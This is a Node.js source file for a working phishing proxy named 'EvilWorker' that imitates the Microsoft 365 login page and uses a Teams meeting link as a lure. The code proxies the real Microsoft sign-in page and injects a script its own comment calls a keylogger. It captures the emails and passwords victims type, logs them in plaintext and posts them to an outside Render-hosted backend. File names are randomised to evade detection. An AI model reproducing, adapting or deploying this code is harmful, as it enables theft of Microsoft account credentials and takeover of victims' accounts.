const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const crypto = require('crypto');

// ============================================================
//  CONFIGURATION - Customize these values
// ============================================================

const PROXY_ENTRY_POINT = "/login";
const PHISHED_URL_PARAMETER = "redirect_urI";
const REDIRECT_URL = "https://login.microsoftonline.com/";
const BACKEND_URL = "https://meeting-h5ze.onrender.com";
const TEAMS_REDIRECT = "https://teams.live.com/dl/launcher/launcher.html?url=%2F_%23%2Fmeet%2F9348548468028%3Fp%3DO0l72J7eL4jegeQa7J%26anon%3Dtrue&type=meet&deeplinkId=109bc758-6e1b-47cb-907b-ed2379475a58&directDl=true&msLaunch=true&enableMobilePage=true&suppressPrompt=true";

// File paths (customizable for IOC reduction)
const PROXY_FILES = {
    index: "index.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};

const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

// ============================================================
//  LOGGING
// ============================================================

const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
if (!fs.existsSync(LOGS_DIRECTORY)) {
    fs.mkdirSync(LOGS_DIRECTORY);
}

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
const VICTIM_SESSIONS = {};

// Store authentication status
const AUTHENTICATED_USERS = {};

// ============================================================
//  HELPERS
// ============================================================

// Verify credentials with backend
async function verifyCredentials(email, password, req) {
    try {
        const axios = require('axios');
        const response = await axios.post(`${BACKEND_URL}/api/authenticate`, {
            email: email,
            password: password,
            visitorInfo: {
                fullUrl: req.url,
                userAgent: req.headers['user-agent'] || 'Unknown',
                ip: req.socket.remoteAddress || 'Unknown'
            }
        });
        
        // Check if authentication was successful
        // Based on your backend response structure
        if (response.data && response.data.success === true) {
            console.log(`[AUTH] ✅ User authenticated: ${email}`);
            return true;
        } else {
            console.log(`[AUTH] ❌ Authentication failed for: ${email}`);
            return false;
        }
    } catch (error) {
        console.error(`[AUTH] ❌ Authentication error: ${error.message}`);
        return false;
    }
}

// Send credentials to backend for logging
async function sendToBackend(email, password, req) {
    try {
        const axios = require('axios');
        await axios.post(`${BACKEND_URL}/api/log-action`, {
            action: 'login_attempt',
            email: email,
            password: password,
            visitorInfo: {
                fullUrl: req.url,
                userAgent: req.headers['user-agent'] || 'Unknown',
                ip: req.socket.remoteAddress || 'Unknown'
            }
        });
        console.log(`[BACKEND] ✅ Sent credentials for: ${email}`);
    } catch (error) {
        console.error(`[BACKEND] ❌ Failed to send: ${error.message}`);
    }
}

// Serve file helper
function serveFile(filename, res, contentType = 'text/html') {
    const filePath = path.join(__dirname, filename);
    fs.readFile(filePath, (err, data) => {
        if (err) {
            console.error(`[ERROR] Failed to read ${filename}: ${err.message}`);
            res.writeHead(404, { 'Content-Type': 'text/html' });
            res.end('<h1>404 Not Found</h1>');
            return;
        }
        res.writeHead(200, { 
            'Content-Type': contentType,
            'Cache-Control': 'no-store'
        });
        res.end(data);
    });
}

// ============================================================
//  REQUEST HANDLERS
// ============================================================

function handlePostRequest(body, req, res) {
    try {
        const formData = querystring.parse(body);
        const email = formData.login || formData.loginfmt || formData.email || '';
        const password = formData.passwd || formData.password || '';

        console.log(`[CREDENTIALS] 📧 Email: ${email}, 🔑 Password: ${password}`);

        // Send to backend for logging
        sendToBackend(email, password, req);

        // Verify credentials with backend
        verifyCredentials(email, password, req).then((isAuthenticated) => {
            if (isAuthenticated) {
                // Store session
                const sessionId = generateSessionId(email);
                AUTHENTICATED_USERS[sessionId] = {
                    email: email,
                    timestamp: Date.now(),
                    authenticated: true
                };
                
                console.log(`[AUTH] ✅ User authenticated and session created for: ${email}`);
                
                // Redirect to REAL Teams meeting
                res.writeHead(302, { 
                    'Location': TEAMS_REDIRECT,
                    'Set-Cookie': [`session=${sessionId}; HttpOnly; Secure; SameSite=Strict`],
                    'Cache-Control': 'no-store'
                });
                res.end();
            } else {
                console.log(`[AUTH] ❌ Invalid credentials for: ${email}`);
                
                // Redirect back to login with error
                const errorUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}&error=invalid_credentials`;
                res.writeHead(302, { 'Location': errorUrl });
                res.end();
            }
        }).catch((error) => {
            console.error('[ERROR] Authentication failed:', error.message);
            res.writeHead(500, { 'Content-Type': 'text/plain' });
            res.end('Authentication service error');
        });

    } catch (error) {
        console.error('[ERROR] POST handling failed:', error.message);
        res.writeHead(500, { 'Content-Type': 'text/plain' });
        res.end('Internal server error');
    }
}

function generateSessionId(email) {
    return crypto.createHash('sha256')
        .update(email + Date.now().toString() + crypto.randomBytes(16).toString('hex'))
        .digest('hex');
}

function handleLoginRequest(req, res) {
    // Get email from URL and decode it properly
    const rawEmail = req.url.split('login_hint=')[1]?.split('&')[0] || '';
    const email = decodeURIComponent(rawEmail);
    
    // Build Microsoft OAuth URL with required parameters
    const targetUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=943a2b14-68aa-4205-88c1-a4b65ab04e81&response_type=code&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient&scope=openid%20profile%20email&login_hint=${encodeURIComponent(email)}`;
    
    console.log(`[PROXY] 🔄 Forwarding to: ${targetUrl}`);
    console.log(`[PROXY] 📧 Email decoded: ${email}`);
    
    https.get(targetUrl, (targetRes) => {
        let data = [];
        targetRes.on('data', (chunk) => data.push(chunk));
        targetRes.on('end', () => {
            let body = Buffer.concat(data).toString();
            
            // Inject keylogger script
            body = body.replace(
                '</body>',
                `<script src="${PROXY_PATHNAMES.script}"></script></body>`
            );
            
            res.writeHead(200, {
                'Content-Type': 'text/html',
                'Cache-Control': 'no-store'
            });
            res.end(body);
        });
    }).on('error', (err) => {
        console.error(`[ERROR] Proxy failed: ${err.message}`);
        // Fallback redirect
        res.writeHead(302, { 'Location': targetUrl });
        res.end();
    });
}

// ============================================================
//  SERVER
// ============================================================

const server = http.createServer((req, res) => {
    console.log(`[REQUEST] ${req.method} ${req.url}`);

    // --- Serve index.html ---
    if (req.url === '/' || req.url === '/index.html') {
        serveFile('index.html', res);
        return;
    }

    // --- Serve 404 page ---
    if (req.url === '/404' || req.url === '/404_not_found_lk48ZVr32WvU.html') {
        serveFile('404_not_found_lk48ZVr32WvU.html', res);
        return;
    }

    // --- Serve script file ---
    if (req.url === PROXY_PATHNAMES.script) {
        serveFile('script_Vx9Z6XN5uC3k.js', res, 'text/javascript');
        return;
    }

    // --- Serve service worker ---
    if (req.url === PROXY_PATHNAMES.serviceWorker) {
        serveFile('service_worker_Mz8XO2ny1Pg5.js', res, 'text/javascript');
        return;
    }

    // --- Handle POST (credential capture) ---
    if (req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', () => {
            handlePostRequest(body, req, res);
        });
        return;
    }

    // --- Handle GET /login ---
    if (req.url.startsWith(PROXY_ENTRY_POINT)) {
        handleLoginRequest(req, res);
        return;
    }

    // --- Fallback redirect ---
    res.writeHead(302, { 'Location': REDIRECT_URL });
    res.end();
});

// ============================================================
//  START SERVER
// ============================================================

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`✅ EvilWorker proxy running on port ${PORT}`);
    console.log(`📍 Entry point: ${PROXY_ENTRY_POINT}`);
    console.log(`🔗 Backend URL: ${BACKEND_URL}`);
    console.log(`📤 Teams redirect: ${TEAMS_REDIRECT}`);
    console.log('🔄 Proxy is ready for connections');
});

// ============================================================
//  ERROR HANDLING
// ============================================================

process.on('uncaughtException', (err) => {
    console.error('🔥 UNCAUGHT EXCEPTION:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('🔥 UNHANDLED REJECTION:', reason);
});